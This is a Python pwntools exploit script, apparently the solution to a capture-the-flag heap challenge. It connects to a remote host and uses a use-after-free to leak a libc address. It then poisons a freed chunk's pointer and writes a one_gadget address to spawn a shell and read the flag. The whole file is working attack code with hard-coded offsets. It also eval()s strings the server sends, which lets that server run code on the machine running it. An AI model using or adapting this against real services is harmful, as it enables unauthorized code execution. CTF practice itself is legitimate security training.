#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwn import *

io = remote("192.168.18.21", 9999)
# io = process("./pwn")
# libc = ELF("./libc.so.6", checksec=False)
# elf = ELF("./bflat", checksec=False)

context.log_level = "info"


def ru(a, drop=False):
    return io.recvuntil(a, drop)


lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
rl = lambda a=False: io.recvline(a)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def cmd(choice):
    ru(b"Your Choice: \n")
    sl(i2b(choice))


def win_gift():
    cmd(666)
    ru(b"But,you have to win it by yourself\n")
    sl(i2b(1))
    for i in range(1000):
        res = eval(ru(b"= ?", drop=True))
        sl(i2b(res))
        if i % 100 == 0:
            lg(b"i", i)
    ru(b"Now,you have earned your award!\n")


def add(size, data):
    cmd(1)
    ru(b"please tell me how much you want to have:\n")
    sl(i2b(size))
    ru(b"Content:\n")
    s(data)


def delet(idx):
    cmd(2)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


def edit(idx, data):
    cmd(3)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))
    ru(b"What do you want?\n")
    s(data)


def show(idx):
    cmd(4)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


for i in range(8):
    add(0x90, b"a")

add(0x90, b"b")
for i in range(8):
    delet(i)
show(7)
ru(b"info:\n")
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x1ECBE0
lg("libc_base", libc_base)

edit(6, p64(libc_base + 0x1E9000 - 0x80 * 15))
add(0x90, b"a")
# add(0x90, p64(0xDEADBEEF) * (0x88 // 8))
win_gift()

add(0x90, p64(libc_base + 0xE3AFE) * (0x88 // 8))

cmd(5)
sl(b"cat /flag")

ia()
